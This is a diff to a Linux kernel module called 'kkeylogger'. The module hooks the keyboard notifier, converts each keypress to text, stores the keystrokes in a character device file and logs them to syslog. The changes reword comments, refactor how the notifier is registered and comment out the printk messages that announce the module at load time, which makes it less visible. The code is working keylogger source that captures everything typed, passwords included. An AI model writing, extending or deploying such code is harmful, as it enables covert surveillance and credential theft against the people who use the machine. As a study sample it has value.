@@ -3,7 +3,7 @@
 /* Meta Information */
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Itay Nafrin");
-MODULE_DESCRIPTION("Registers a device number. Auto create /dev file. Add information from the keys pressed to the file.");
+MODULE_DESCRIPTION("Registers a device number. Auto create a character device file. Add information from the keys pressed to the file.");
 
 
 int keycode_to_string(int keycode, int shift_mask, char* buf, unsigned int buf_size)
@@ -27,7 +27,7 @@ int keyboard_event_handler(struct notifier_block* nblock, unsigned long code, vo
         if (!(param->down))
                 return NOTIFY_OK;
 
-        if(code == KBD_KEYCODE)
+        if(code == KBD_KEYCODE) //Check if it's the main keyboard and not other input devices
         {
                 len = keycode_to_string(param->value, param->shift, keybuf, 12);
 
@@ -36,8 +36,7 @@ int keyboard_event_handler(struct notifier_block* nblock, unsigned long code, vo
                         strncpy(msg+buf_index, keybuf, len);
                         buf_index += len;
 
-                        // msg[buf_index] = '\n';
-                        //buf_index += 1;
+		       /* A way of debuging and seeing the key pressed in the syslog file. */
 			printk(KERN_INFO "Keylog: %s", keybuf);
                 }
 
@@ -55,14 +54,16 @@ static struct notifier_block keysniffer_blk = {
  */
 static int __init keylogger_init(void) {
         int retval;
-        printk("Hello, Kernel!\n");
+        
+	//printk("Hello, Kernel!\n");
 
         /* Allocate a device nr */
         if( alloc_chrdev_region(&dev_nr, 0, 1, DRIVER_NAME) < 0) {
                 printk("Device Nr. could not be allocated!\n");
                 return -1;
         }
-        printk("kkeylogger - Device Nr. Major: %d, Minor: %d was registered!\n", MAJOR(dev_nr), MINOR(dev_nr));
+        
+	//printk("kkeylogger - Device Num. Major: %d, Minor: %d was registered!\n", MAJOR(dev_nr), MINOR(dev_nr));
 
         /* Create device class */
         if((my_class = class_create(THIS_MODULE, DRIVER_CLASS)) == NULL) {
@@ -84,8 +85,9 @@ static int __init keylogger_init(void) {
                 printk("Registering of device to kernel failed!\n");
                 goto AddError;
         }
-
-	if((register_keyboard_notifier(&keysniffer_blk) < 0))
+	
+	retval = register_keyboard_notifier(&keysniffer_blk);
+	if(retval < 0)
 	{
 		printk(KERN_ALERT "Unable to load key notifier!\n");
 		return -1;
